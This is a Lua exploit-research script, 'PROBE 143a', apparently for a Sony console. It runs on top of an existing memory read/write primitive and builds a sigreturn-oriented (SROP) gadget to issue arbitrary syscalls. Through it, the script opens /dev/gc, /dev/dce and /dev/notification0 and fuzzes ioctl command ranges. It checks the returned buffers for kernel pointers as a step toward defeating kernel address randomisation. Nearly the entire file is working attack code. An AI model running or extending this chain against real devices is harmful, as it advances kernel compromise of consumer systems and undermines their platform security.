-- CRASH_CLASS: LOW
-- PROBE 143a: Sony device ioctl fuzzer for /dev/gc and /dev/dce
-- Scan ioctl command ranges looking for ones that return data.

print("=== PROBE 143a: IOCTL FUZZ ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

--------------------------------------------------------------------
-- [A] Open devices
--------------------------------------------------------------------
print("--- [A] Open ---")

local path_buf = gpu + 0x100
make_path(path_buf, "/dev/gc")
local rv_gc = srop(5, ua(path_buf), uint64(2))
local gch, gcl = get_hi_lo(rv_gc)
print("[A] gc=" .. gcl)

make_path(path_buf, "/dev/dce")
local rv_dce = srop(5, ua(path_buf), uint64(2))
local dceh, dcel = get_hi_lo(rv_dce)
print("[A] dce=" .. dcel)

make_path(path_buf, "/dev/notification0")
local rv_n0 = srop(5, ua(path_buf), uint64(6))  -- O_RDWR|O_NONBLOCK
local n0h, n0l = get_hi_lo(rv_n0)
print("[A] notif0=" .. n0l)

--------------------------------------------------------------------
-- [B] Scan /dev/gc ioctls
-- Try groups: 'g'=0x67, 'G'=0x47, 'd'=0x64, 'S'=0x53
-- Formats: _IOR (0x40), _IOWR (0xC0) with 64-byte buffer
--------------------------------------------------------------------
print("")
print("--- [B] /dev/gc ioctl scan ---")

local buf = gpu + 0x1000
local gc_fd = gcl

if gc_fd < 256 and gch == 0 then
    -- _IOR(group, num, size) = (0x40000000 | (size<<16) | (group<<8) | num)
    -- Try _IOR with 128-byte output for each group
    local groups = {0x67, 0x47, 0x64, 0x44, 0x53}  -- g, G, d, D, S
    local ok_count = 0

    for _, grp in ipairs(groups) do
        for num = 0, 31 do
            -- _IOR(grp, num, 128) = 0x40800000 | (grp<<8) | num
            local code = 0x40800000 + grp * 256 + num
            for off = 0, 0x7F, 4 do wd(buf + off, 0) end

            local rv = srop(54, uint64(gc_fd), uint64(code), ua(buf))
            local rh, rl = get_hi_lo(rv)
            if rl == 0 and rh == 0 then
                ok_count = ok_count + 1
                local b0 = safe_rd(buf) or 0
                local b4 = safe_rd(buf + 4) or 0
                print("[B] gc OK: 0x" .. string.format("%08X", code) ..
                      " [0]=0x" .. string.format("%08X", b0) ..
                      " [4]=0x" .. string.format("%08X", b4))
                -- Check for kernel pointers
                for ioff = 0, 0x78, 8 do
                    local q = safe_rq(buf + ioff)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            print("[B] *** GC KERNEL PTR cmd=0x" .. string.format("%08X", code) ..
                                  " +" .. string.format("%02X", ioff) .. "=" .. hex(q) .. " ***")
                        end
                    end
                end
            end
            if ok_count >= 10 then break end
        end
        if ok_count >= 10 then break end
    end

    -- Also try _IOWR
    for _, grp in ipairs(groups) do
        for num = 0, 15 do
            local code = 0xC0800000 + grp * 256 + num
            for off = 0, 0x7F, 4 do wd(buf + off, 0) end
            local rv = srop(54, uint64(gc_fd), uint64(code), ua(buf))
            local rh, rl = get_hi_lo(rv)
            if rl == 0 and rh == 0 then
                ok_count = ok_count + 1
                print("[B] gc IOWR OK: 0x" .. string.format("%08X", code))
                for ioff = 0, 0x78, 8 do
                    local q = safe_rq(buf + ioff)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            print("[B] *** GC IOWR KPTR +" .. string.format("%02X", ioff) .. "=" .. hex(q))
                        end
                    end
                end
            end
        end
    end

    if ok_count == 0 then
        print("[B] No gc ioctls succeeded in scanned range")
    end
end

--------------------------------------------------------------------
-- [C] Scan /dev/dce ioctls
--------------------------------------------------------------------
print("")
print("--- [C] /dev/dce ioctl scan ---")

if dcel < 256 and dceh == 0 then
    local dce_fd = dcel
    local ok_c = 0

    local groups = {0x64, 0x44, 0x67, 0x47, 0x53}  -- d, D, g, G, S
    for _, grp in ipairs(groups) do
        for num = 0, 31 do
            local code = 0x40800000 + grp * 256 + num
            for off = 0, 0x7F, 4 do wd(buf + off, 0) end
            local rv = srop(54, uint64(dce_fd), uint64(code), ua(buf))
            local rh, rl = get_hi_lo(rv)
            if rl == 0 and rh == 0 then
                ok_c = ok_c + 1
                local b0 = safe_rd(buf) or 0
                print("[C] dce OK: 0x" .. string.format("%08X", code) ..
                      " [0]=0x" .. string.format("%08X", b0))
                for ioff = 0, 0x78, 8 do
                    local q = safe_rq(buf + ioff)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            print("[C] *** DCE KPTR cmd=0x" .. string.format("%08X", code) ..
                                  " +" .. string.format("%02X", ioff) .. "=" .. hex(q) .. " ***")
                        end
                    end
                end
            end
            if ok_c >= 10 then break end
        end
        if ok_c >= 10 then break end
    end
    if ok_c == 0 then
        print("[C] No dce ioctls succeeded")
    end
end

--------------------------------------------------------------------
-- [D] Try notification0 ioctl
--------------------------------------------------------------------
print("")
print("--- [D] notification0 ioctl ---")

if n0l < 256 and n0h == 0 then
    local ok_d = 0
    for num = 0, 31 do
        for _, grp in ipairs({0x4E, 0x6E, 0x53}) do  -- N, n, S
            local code = 0x40800000 + grp * 256 + num
            for off = 0, 0x7F, 4 do wd(buf + off, 0) end
            local rv = srop(54, uint64(n0l), uint64(code), ua(buf))
            local rh, rl = get_hi_lo(rv)
            if rl == 0 and rh == 0 then
                ok_d = ok_d + 1
                local b0 = safe_rd(buf) or 0
                print("[D] notif OK: 0x" .. string.format("%08X", code) ..
                      " [0]=0x" .. string.format("%08X", b0))
            end
        end
    end
    if ok_d == 0 then print("[D] No notif ioctls succeeded") end
end

-- Close devices
if gcl < 256 and gch == 0 then srop(6, uint64(gcl)) end
if dcel < 256 and dceh == 0 then srop(6, uint64(dcel)) end
if n0l < 256 and n0h == 0 then srop(6, uint64(n0l)) end

print("")
print("=== DONE ===")
